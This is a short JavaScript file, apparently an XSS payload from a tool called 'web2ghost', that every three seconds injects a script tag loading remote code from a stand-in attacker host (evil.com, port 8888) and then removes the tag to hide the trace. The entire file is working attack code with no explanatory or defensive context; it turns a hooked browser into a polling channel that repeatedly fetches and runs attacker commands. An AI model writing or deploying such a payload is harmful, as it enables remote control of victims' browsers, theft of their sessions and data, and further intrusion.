//code by yuxi4n

function injectScript(src){
	s=document.createElement("script");
	s.src=src;
	document.getElementsByTagName("body")[0].appendChild(s);
	return s;
}
function removeScript(s){
	document.body.removeChild(s);
}

setInterval(function(){
	//alert(0)
	//injectScript('http://127.0.0.1:8088/knownxss/lib/inject.js');
	var rtcmd = injectScript('http://www.evil.com:8888/web2ghost/injxss.php');
	setTimeout(function(){removeScript(rtcmd);}, 500);
	},
3000);
